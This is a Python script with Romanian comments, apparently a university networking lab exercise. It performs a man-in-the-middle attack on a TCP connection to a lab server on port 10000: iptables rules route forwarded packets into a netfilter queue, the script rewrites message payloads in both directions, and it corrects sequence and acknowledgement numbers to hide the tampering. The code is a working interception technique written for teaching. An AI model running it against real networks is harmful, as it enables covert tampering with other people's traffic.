# cod referinta: https://networks.hypha.ro/capitolul6/#scapy_nfqueue

from netfilterqueue import NetfilterQueue as NFQ
from scapy.all import IP, TCP, Raw, send
import os


# configurarea target ului (server) si portul pe care ruleaza
SERVER_IP = "198.7.0.2"
SERVER_PORT = 10000

# pentru fiecare conexiune se pastreaza offsetul pt a putea modifica corect seq/ack cand se modifica lungimea pachetului
# key=(client_ip, client_port) -> [offset_client2server, offset_server2client]
connections = {}
# TCP sequence numbers pastreaza numarul de bytes;
# adaugarea de bytes extra in stream -> celelalte pachete seq/ack devin gresite in ft de ce se asteapta clientul/serverul
# deci pt fiecare conexiune se tine minte CATI bytes a inserat 


# efectiv modificarile de mesaje
def modify_client2server(payload):
    return b"[middle a modificat mesajul clientului] " + payload
def modify_server2client(payload):
    return payload + b" [mesaj adaugat de middle in raspunsul serverului]"

# callback ul pentru procesarea pachetelor
def proceseaza(pachet): # pachet de tip netfilterqueue.Packet
    new_payload = None # default-ul care o sa fie schimbat daca chiar exista date in pachet
    diferenta = 0 # delta/ diferenta dintre msj original si cel schimbat
    octeti = pachet.get_payload() # ia efectiv raw packet bytes = payload (header + data) bytes
    scapy_packet = IP(octeti) # creeaza un pachet scapy cu layer-ul IP
    ip = scapy_packet[IP] # layer IP din pachet
    tcp = scapy_packet[TCP] # layer TCP din pachet
    # tb verificat in ce directie merge mesajul curent
    is_client2server = (tcp.dport == SERVER_PORT)
    # destinatie = server port -> mesaj client-server
    # destinatie = client port -> mesaj server-client

    # cheia din connections pt a pastra offset-ul
    # offset = difierenta de biti dintre mesajul adevarat si mesajul modificat
    if is_client2server:
        conn_key = (ip.src, tcp.sport) #
    else:
        conn_key = (ip.dst, tcp.dport)
    if conn_key not in connections:
        connections[conn_key] = [0, 0]  # [offset_client2server, offset_server2client]

    offset_client2server, offset_server2client = connections[conn_key]

    # SYN = 0x02, ACK = 0x10, RST = 0x04
    # tcp.flags & 0x04 insemna ca bitul RST e setat = connection reset
    # tcp.flags & 0x02 and not (tcp.flags & 0x10) insemna ca e un SYN FARA bitul ACK = connection request
    # oricum offset-ul de la SYN e 0 pt ca nu s-a trimis vreun mesaj inca
    # deci se pot trimite pachetele SYN/RST fara sa se modifice dupa offset
    if tcp.flags & 0x04 or (tcp.flags & 0x02 and not (tcp.flags & 0x10)):
        pachet.accept()
        return

    # variabila booleana sa verifice daca pachetul are mesaj sau nu (pdaca pachetul are un layer RAW cu macar un byte)
    if scapy_packet.haslayer(Raw) and len(scapy_packet[Raw].load) > 0:
        has_data = True
    else:
        has_data = False



    # partea de modificare a payload-ului cu date propriu-zise
    if has_data: # pachetul are date
        # se ia originalul
        # se creeaza un payload nou cu date modificate
        # se calculeaza diferenta dintre bytes
        original = scapy_packet[Raw].load
        if is_client2server:
            new_payload = modify_client2server(original)
        else:
            new_payload = modify_server2client(original)
        diferenta = len(new_payload) - len(original)
        print(f"{'C->S' if is_client2server else 'S->C'} payload: {original!r} -> {new_payload!r}")

    # ajustarea propriu-zisa pentru SYN/ACK in functie de offset
    if is_client2server:
        new_seq = tcp.seq + offset_client2server # secventa curenta primeste IN PLUS (fiindca am modificat mesajul)
        if (tcp.flags & 0x10):  # acknowledgement-ul SCADE fiindca endpoint-ul celalalt nu a inserat nciodata bytes in plus -> se preface ca a ramas la lungimea aia
            new_ack = (tcp.ack - offset_server2client)
        else:
            new_ack = tcp.ack
    else: # nalog pentru cealalta directei server 2 client
        new_seq = tcp.seq + offset_server2client
        if (tcp.flags & 0x10):
            new_ack = (tcp.ack - offset_client2server)
        else:
            new_ack = tcp.ack

    # se updateaza offsetul pentru urmatorul mesaj in functie de directie
    # proces care trebuie neaparat facut DUPA ce s-a calculat new_seq pentru ca altfel apare un gap in stream
    if diferenta != 0:
        if is_client2server:
            connections[conn_key][0] += diferenta
        else:
            connections[conn_key][1] += diferenta
    # pt pachete fara date sau pachete cu date dar care nu au fost modificate (diferenta = 0) se da accept fara modificari
    if not has_data and offset_client2server == 0 and offset_server2client == 0:
        pachet.accept()
        return

    new_pkt = ( # construirea unui pachet nou cu scapy care are operatia de compunere intre layere implementata prin operatorul /
        IP(src=ip.src, dst=ip.dst, ttl=ip.ttl, tos=ip.tos, proto=ip.proto)
        / TCP(sport=tcp.sport,dport=tcp.dport,seq=new_seq,ack=new_ack,flags=tcp.flags,window=tcp.window,urgptr=tcp.urgptr,options=tcp.options,)
    )
    if new_payload: # se face COMPUNERE cu noul payload Raw (daca exista altfel pachetul e doar header)
        new_pkt = new_pkt / Raw(load=new_payload)

    # sterge campurile care oricum ar fi trebuit sa fie modificate pentru ca
    # scapy le recalculeaza singur si le pun ecorect in pachet
    del new_pkt[IP].len
    del new_pkt[IP].chksum
    del new_pkt[TCP].chksum
    # vazusem pe un site ca exista metoda pachet.set_payload dar aia merge doar pentru pachetele car NU sunt modificate in lungime
    # nu se poate pur si simplu deci sa se modifice pachetul si trebuie sters
    pachet.drop()
    send(new_pkt, verbose=False) #  finally operatia de send a pachetului nou!!

# super important NOTRACK pentru ca altfel nu se mai trimit in partile respective mesajele deloc
# NOTRACK in tabelul raw = face ca si conntrack sa ignore complet traficul portului 10000
# fara NOTRACK pachetul original e inregistrat de conntrack in FORWARD i se da drop si se trimite 
# un pachet nou prin OUTPUT unde conntrack le vede ca doua conexiuni diferite si le marcheaza ca fiind invaide
os.system(f"iptables -t raw -I PREROUTING -p tcp --dport {SERVER_PORT} -j NOTRACK")
os.system(f"iptables -t raw -I PREROUTING -p tcp --sport {SERVER_PORT} -j NOTRACK")
os.system(f"iptables -t raw -I OUTPUT    -p tcp --dport {SERVER_PORT} -j NOTRACK")
os.system(f"iptables -t raw -I OUTPUT    -p tcp --sport {SERVER_PORT} -j NOTRACK")

# ii spune kernel-ului sa ia pachetele tcp care merg spre/ vin dinspre server si sa le pune in coada 0
os.system(f"iptables -I FORWARD -p tcp --dport {SERVER_PORT} -j NFQUEUE --queue-num 0")
os.system(f"iptables -I FORWARD -p tcp --sport {SERVER_PORT} -j NFQUEUE --queue-num 0")
print(f"Intercepting TCP port {SERVER_PORT} traffic")

queue = NFQ()
queue.bind(0, proceseaza) # callback catre proceseaza pentru fiecare pachet care ajunge in coada 0
try:
    queue.run() # trage pachete incontinuu de la kernel queue si le trimite catre fiecare proceseaza
except KeyboardInterrupt:
    print("\nStopping...")
finally:
    # flag-ul de -D vine de la delete pentru a sterge regulile adaugate la inceput
    os.system(f"iptables -D FORWARD -p tcp --dport {SERVER_PORT} -j NFQUEUE --queue-num 0")
    os.system(f"iptables -D FORWARD -p tcp --sport {SERVER_PORT} -j NFQUEUE --queue-num 0")
    os.system(f"iptables -t raw -D PREROUTING -p tcp --dport {SERVER_PORT} -j NOTRACK")
    os.system(f"iptables -t raw -D PREROUTING -p tcp --sport {SERVER_PORT} -j NOTRACK")
    os.system(f"iptables -t raw -D OUTPUT    -p tcp --dport {SERVER_PORT} -j NOTRACK")
    os.system(f"iptables -t raw -D OUTPUT    -p tcp --sport {SERVER_PORT} -j NOTRACK")
    queue.unbind()
